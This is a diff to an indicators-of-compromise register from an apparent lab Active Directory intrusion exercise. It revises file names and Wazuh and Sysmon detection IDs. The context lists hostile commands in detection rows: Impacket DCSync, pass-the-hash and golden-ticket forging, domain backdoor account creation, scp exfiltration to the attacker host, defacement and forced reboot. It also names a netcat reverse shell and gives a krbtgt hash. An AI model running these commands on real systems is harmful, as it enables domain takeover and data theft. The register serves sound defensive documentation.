@@ -52,8 +52,8 @@ This register provides the definitive, unredacted catalog of Indicators of Compr
 | `/tmp/f` | DVWA (`192.168.56.30`) | Named Pipe (FIFO) | N/A (Special Device) | Created via `mkfifo /tmp/f` to establish bidirectional Netcat reverse shell on port 4444. | **HIGH (Confirmed)** |
 | `/tmp/win10.hash` | DVWA (`192.168.56.30`) | Text Hash Dump | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Captured NetNTLMv2 challenge-response hash for `win10` written by Responder. | **HIGH (Confirmed)** |
 | `/tmp/hank.hash` | DVWA (`192.168.56.30`) | Text Hash Dump | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Kerberoasted RC4-HMAC service ticket hash extracted via `GetUserSPNs.py`. | **HIGH (Confirmed)** |
-| `/tmp/dcsync_output.txt` | DVWA (`192.168.56.30`) | Text Dump | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Raw DCSync NTDS directory dump containing all domain account NTLM hashes. | **HIGH (Confirmed)** |
-| `/tmp/admin.ccache` | DVWA (`192.168.56.30`) | Kerberos Ticket | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Forged Kerberos Golden Ticket forged with compromised `krbtgt` NTLM key. | **HIGH (Confirmed)** |
+| `/tmp/dcsync_output.ntds` | DVWA (`192.168.56.30`) | Text Dump | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Raw DCSync NTDS directory dump containing all domain account NTLM hashes. | **HIGH (Confirmed)** |
+| `/tmp/Administrator.ccache` | DVWA (`192.168.56.30`) | Kerberos Ticket | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Forged Kerberos Golden Ticket forged with compromised `krbtgt` NTLM key. | **HIGH (Confirmed)** |
 | `C:\Windows\Temp\domain_users.txt` | `PC-DC` (`192.168.56.10`) | Text File | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Staged reconnaissance output of `net user /domain` command. | **HIGH (Confirmed)** |
 | `C:\Windows\Temp\admin_info.txt` | `PC-DC` (`192.168.56.10`) | Text File | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Staged reconnaissance output of `net localgroup Administrators` command. | **HIGH (Confirmed)** |
 | `C:\Windows\Temp\sensitive_data.txt` | `Win10User` (`192.168.56.20`) | Text File | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Harvested confidential workstation documents staged for exfiltration. | **HIGH (Confirmed)** |
@@ -97,7 +97,7 @@ This register provides the definitive, unredacted catalog of Indicators of Compr
 | Workstation User Hash | NetNTLMv2 | `win10::AD:1122334455667788:B5F2A8...` | Stage 10 (Responder) | Account password rotated; LLMNR disabled. |
 | Kerberoast TGS Ticket | Kerberos 5 TGS-REP | `$krb5tgs$23$*HANK_SHERMAN$AD.LAB...` | Stage 13 (Kerberoast) | SPN deleted; account demoted; AES enforced. |
 | Compromised krbtgt Hash | NTLM | `611a8cdcc21cb3fe3bf3a4c2f4e05f60` | Stage 14 (DCSync) | Password reset twice; KVNO incremented to 3. |
-| Forged Golden Ticket | Kerberos TGT (ccache) | Staged as `/tmp/admin.ccache` (KVNO 2) | Stage 16 (ticketer.py) | Invalidated via krbtgt double reset; verified deleted. |
+| Forged Golden Ticket | Kerberos TGT (ccache) | Staged as `/tmp/Administrator.ccache` (KVNO 2) | Stage 16 (ticketer.py) | Invalidated via krbtgt double reset; verified deleted. |
 | Injected Root SSH Key | OpenSSH ED25519 | `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIACi7TGj+OejU78IWt/I6/im7sLXOR1jben7h94DmDJ5 kali@kali` | Stage 08 (SSH Persist) | Purged from `/root/.ssh/authorized_keys`. |
 
 ---
@@ -120,8 +120,8 @@ This register provides the definitive, unredacted catalog of Indicators of Compr
 | **Impacket DCSync** | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@192.168.56.10' -just-dc` | DVWA -> DC | Wazuh Rule 5715 / Windows EID 4662 | `T1003.006` |
 | **Impacket wmiexec** | `python3 wmiexec.py -hashes :... Administrator@192.168.56.10` | DVWA -> DC | Windows EID 4624 (Logon Type 3 NTLM) | `T1550.002` |
 | **Impacket ticketer** | `python3 ticketer.py -nthash 611a8cdcc... -domain-sid S-1-5-21... -domain ad.lab Administrator` | DVWA | Wazuh Rule 5715 / Auditd execution | `T1558.001` |
-| **Net User Backdoor** | `cmd.exe /Q /c net user backdoor P@ssw0rd123! /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60108 / Windows EID 4720 | `T1136.002` |
-| **Net Localgroup DA** | `cmd.exe /Q /c net group "Domain Admins" backdoor /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60109 / Windows EID 4728 | `T1098` |
+| **Net User Backdoor** | `cmd.exe /Q /c net user backdoor P@ssw0rd123! /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60109 / Windows EID 4720 | `T1136.002` |
+| **Net Localgroup DA** | `cmd.exe /Q /c net group "Domain Admins" backdoor /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60159 / Windows EID 4728 | `T1098` |
 | **SCP Exfiltration** | `scp -i id_ed25519 root@192.168.56.30:/tmp/*.txt .` | DVWA -> Kali | Wazuh Rule 5715 Rate Anomaly (6 in 570ms) | `T1041` |
-| **Registry Deface** | `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\Public\hacked.bmp" /f` | DC & Win10 | Wazuh Rule 92041 / Sysmon EID 13 | `T1491.001` |
+| **Registry Deface** | `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\Public\hacked.bmp" /f` | DC & Win10 | Wazuh Rule 92041 / Sysmon EID 1 (reg.exe) | `T1491.001` |
 | **Forced Restart** | `cmd.exe /Q /c shutdown /r /t 0` | DC & Win10 | Sysmon EID 1 / Windows EID 1074 | `T1529` |
